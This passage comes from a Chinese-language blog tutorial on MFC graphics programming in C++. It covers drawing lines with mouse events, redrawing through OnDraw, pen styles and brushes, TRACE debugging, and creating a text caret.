class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>InvalidateRect(NULL);</code>的作用<br>加了这个之后虽然绘制的线条没有刷新了，但是会接住前面的鼠标释放的点。看似连贯但是效果不对。<br>而没加这个，则是无论画多少条线都只会显示最近一次画的，也就是传统说法被刷新了或者叫重绘。</p><p>为了保证安全，再多加一个当前点位的变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CMFCPaintView::<span class="built_in">CMFCPaintView</span>() <span class="keyword">noexcept</span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处添加构造代码</span></span><br><span class="line">m_status = FALSE;</span><br><span class="line">m_start = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">m_stop = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">m_cur = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反正构造函数不要浪费，避免不必要的错误，就都从0，0坐标开始初始化。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonDown</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_start = point;</span><br><span class="line">m_status = TRUE;</span><br><span class="line">    CView::<span class="built_in">OnLButtonDown</span>(nFlags, point);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取设备上下文</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"><span class="built_in">ReleaseDC</span>(pDC);</span><br><span class="line">m_status = FALSE;</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按下和释放不需要怎么改动。</p><p>在鼠标移动消息中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line"><span class="built_in">InvalidateRect</span>(<span class="literal">NULL</span>);</span><br><span class="line">m_cur = point;<span class="comment">//让m_cur = 当前的鼠标坐标。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于这个刷新，它会自动触发函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_cur);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的绘图代码才是我们需要添加的，前面不用管，前面的就是相当于一个刷新白板的操作。<br>也就是我们之前提到过的，最大化和最小化的时候，之前画的线条就消失了，其实就是触发了重绘没有保存。</p><p><code>InvalidateRect</code>会调用<code>OnDraw</code>，在我们没有重写<code>OnDraw</code>的时候，默认操作就是重绘白板。</p><p>一个m_start和m_stop和m_cur只能完整的记录一条线。如果想要画多条，就要用到列表方式去控制。</p><hr><h2 id="画笔"><a href="#画笔" class="headerlink" title="画笔"></a>画笔</h2><p>之前的画线，它的粗细和颜色和形状都不能调整。所以可以尝试修改这些。</p><p>用画笔自然也要用它封装好的类，CPen</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CPen</span> : <span class="keyword">public</span> CGdiObject</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DECLARE_DYNAMIC</span>(CPen)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">static</span> CPen* PASCAL <span class="title">FromHandle</span><span class="params">(HPEN hPen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"><span class="built_in">CPen</span>();</span><br><span class="line"><span class="built_in">CPen</span>(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, COLORREF crColor);</span><br><span class="line"><span class="built_in">CPen</span>(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, <span class="type">const</span> LOGBRUSH* pLogBrush,</span><br><span class="line"><span class="type">int</span> nStyleCount = <span class="number">0</span>, <span class="type">const</span> DWORD* lpStyle = <span class="literal">NULL</span>);</span><br><span class="line"><span class="function">BOOL <span class="title">CreatePen</span><span class="params">(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, COLORREF crColor)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreatePen</span><span class="params">(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, <span class="type">const</span> LOGBRUSH* pLogBrush,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nStyleCount = <span class="number">0</span>, <span class="type">const</span> DWORD* lpStyle = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreatePenIndirect</span><span class="params">(LPLOGPEN lpLogPen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attributes</span></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">HPEN</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetLogPen</span><span class="params">(LOGPEN* pLogPen)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetExtLogPen</span><span class="params">(EXTLOGPEN* pLogPen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">CPen</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Dump</span><span class="params">(CDumpContext&amp; dc)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里看到构造的时候有两个带参数了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CPen</span>(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, COLORREF crColor);</span><br><span class="line"><span class="built_in">CPen</span>(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, <span class="type">const</span> LOGBRUSH* pLogBrush,</span><br><span class="line"><span class="type">int</span> nStyleCount = <span class="number">0</span>, <span class="type">const</span> DWORD* lpStyle = <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>刚学先用前者<br>style就是样式，那么具体有</p><ol><li>PS_SOLID    实线</li><li>PS_DASH    虚线</li><li>PS_DOT    点线</li><li>PS_DOTDASH    点划线</li></ol><p>转到定义之后注释其实也很详细的给出了样子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PS_SOLID            0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PS_DASH             1       <span class="comment">/* -------  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PS_DOT              2       <span class="comment">/* .......  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PS_DASHDOT          3       <span class="comment">/* _._._._  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PS_DASHDOTDOT       4       <span class="comment">/* _.._.._  */</span></span></span><br></pre></td></tr></table></figure><p>width自然就是线宽了，一般的单位都是像素。传int就完事。<br>color颜色，表示起来就RGB(RED,GREE,BULR)按照ps那会的情况，数值应该是0-255，暂时没看这里能不能用十六进制的方式塞。</p><p>设置好了笔的属性，就该用这支笔去画。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">3</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);<span class="comment">//要把这个笔加入设备上下文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_cur);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/019.png" class=""><p>可以看到粗细和颜色是有变化了，但是样式好像没看出变化。<br>越来越粗的话肯定是看不出变化的。那么改小一点<br><code>CPen pen(PS_DASH, 1, RGB(255, 0, 0));</code></p><img src="/2022/07/25/mfc01/020.png" class=""><p>可以看到了虚线效果。。。嘶，还挺麻烦。只能用一个像素点才能看到效果。</p><hr><h3 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h3><p>这是一个调试的时候用的函数，可以在输出栏里面打印出一些需要的信息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_cur);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/021.png" class=""><p>毕竟有的时候单步调试比较累，如果能隐约猜到，可以尝试打印看看是否有问题。</p><hr><h2 id="画刷"><a href="#画刷" class="headerlink" title="画刷"></a>画刷</h2><p>用过画图其实应该知道，画笔毕竟画的是点阵练成的线，而画刷画出来的是实心的对象。<br>一个点绘，一个填充。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CBrush</span> : <span class="keyword">public</span> CGdiObject</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DECLARE_DYNAMIC</span>(CBrush)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">static</span> CBrush* PASCAL <span class="title">FromHandle</span><span class="params">(HBRUSH hBrush)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"><span class="built_in">CBrush</span>();</span><br><span class="line"><span class="built_in">CBrush</span>(COLORREF crColor);             <span class="comment">// CreateSolidBrush</span></span><br><span class="line"><span class="built_in">CBrush</span>(<span class="type">int</span> nIndex, COLORREF crColor); <span class="comment">// CreateHatchBrush</span></span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">CBrush</span><span class="params">(CBitmap* pBitmap)</span></span>;          <span class="comment">// CreatePatternBrush</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateSolidBrush</span><span class="params">(COLORREF crColor)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateHatchBrush</span><span class="params">(<span class="type">int</span> nIndex, COLORREF crColor)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateBrushIndirect</span><span class="params">(<span class="type">const</span> LOGBRUSH* lpLogBrush)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreatePatternBrush</span><span class="params">(CBitmap* pBitmap)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateDIBPatternBrush</span><span class="params">(HGLOBAL hPackedDIB, UINT nUsage)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateDIBPatternBrush</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* lpPackedDIB, UINT nUsage)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateSysColorBrush</span><span class="params">(<span class="type">int</span> nIndex)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attributes</span></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">HBRUSH</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetLogBrush</span><span class="params">(LOGBRUSH* pLogBrush)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">CBrush</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Dump</span><span class="params">(CDumpContext&amp; dc)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>CBrush即为c++中的画刷。而构造函数里面，有个是就放颜色就行的。</p><p>起步都一样，创建了之后添加到设备上下文。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"></span><br><span class="line"><span class="function">CBrush <span class="title">brush</span><span class="params">(RGB(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CBrush *pBrush = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;brush);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line"><span class="comment">// pDC-&gt;MoveTo(m_start);</span></span><br><span class="line"><span class="comment">// pDC-&gt;LineTo(m_cur);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//填充矩形</span></span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_cur), &amp;brush);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// pDC-&gt;MoveTo(m_start);</span></span><br><span class="line"><span class="comment">// pDC-&gt;LineTo(m_stop);</span></span><br><span class="line"></span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_stop), &amp;brush);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pBrush);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/022.png" class=""><p>其实就是从按下到释放的两个点延伸出去直至闭合形成一个图形。<br>至于填充的颜色，画刷初始化的时候选择绿色，则默认也为绿色，也就是说<code>pDC-&gt;FillRect(CRect(m_start, m_cur), &amp;brush);</code>后面的参数不选择画刷，用NULL，默认的颜色也是画刷的颜色。<br>也可以创建别的颜色的画刷对象，然后传递，这倒不是啥大问题。</p><p><code>FillRect</code>是填充矩形，那么还有别的几个，下次再整。</p><img src="/2022/07/25/mfc01/023.png" class=""><hr><h2 id="光标和文本"><a href="#光标和文本" class="headerlink" title="光标和文本"></a>光标和文本</h2><p>我们现在跑的这个mfc程序，虽然中间那个空白区域是一个编辑区域，但是前面的功能都是绘制，与传统本文编辑区域而言，他少了一个光标，还有行号或者是分层的感觉。</p><p>至于这个创建光标加在哪里，构造函数肯定不可行，因为窗口绑定有很多相关的东西，不代表你这个地方构造完成了，其它绑定窗口的东西并不一定全部起来了。放在ondraw里面也不合适，那里重绘的话太频繁了这个光标。</p><p>所有的windows程序和mfc程序<br>第一阶段都是构造的时候<br>第二阶段才到达create阶段，在这个时候才会把构造的对象和窗口句柄之类的绑定<br>第三阶段要么showWindow或者doModule，就是显示出这些程序的框架，也就是跑起来了<br>第四阶段大致就是destroy阶段，它这个时候就是去销毁掉窗口<br>第五阶段就是delete阶段，这个时候才是销毁掉构造的对象</p><p>所以构造什么的是肯定行不通了，就要用到Create消息<br>快捷操作就是类视图，选择CMFCPaintView，然后属性里面找到消息，选择create</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CMFCPaintView::OnCreate</span><span class="params">(LPCREATESTRUCT lpCreateStruct)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( CView::<span class="built_in">OnCreate</span>(lpCreateStruct) == <span class="number">-1</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加您专用的创建代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就会得到这样一个模板。这个create消息是create完成之后广播到各个控件，然后调用自己的构造函数，然后去完成一些自定义的操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CMFCPaintView::OnCreate</span><span class="params">(LPCREATESTRUCT lpCreateStruct)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( CView::<span class="built_in">OnCreate</span>(lpCreateStruct) == <span class="number">-1</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加您专用的创建代码</span></span><br><span class="line"><span class="built_in">CreateSolidCaret</span>(<span class="number">3</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">ShowCaret</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在随便指定这个光标大小之后</p><img src="/2022/07/25/mfc01/024.png" class=""><p>截图所以不管他闪不闪了，不过因为这个数值是我们指定的，所以当输入的字体万一大于光标或者小于都会看着很奇怪，显然别的程序肯定是有自适应大小的解决方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CMFCPaintView::OnCreate</span><span class="params">(LPCREATESTRUCT lpCreateStruct)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( CView::<span class="built_in">OnCreate</span>(lpCreateStruct) == <span class="number">-1</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加您专用的创建代码</span></span><br><span class="line"><span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">TEXTMETRIC tm;</span><br><span class="line">dc.<span class="built_in">GetTextMetrics</span>(&amp;tm);</span><br><span class="line"><span class="built_in">CreateSolidCaret</span>(<span class="number">2</span>, tm.tmHeight);</span><br><span class="line"><span class="built_in">ShowCaret</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用了点稀奇古怪的感觉</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 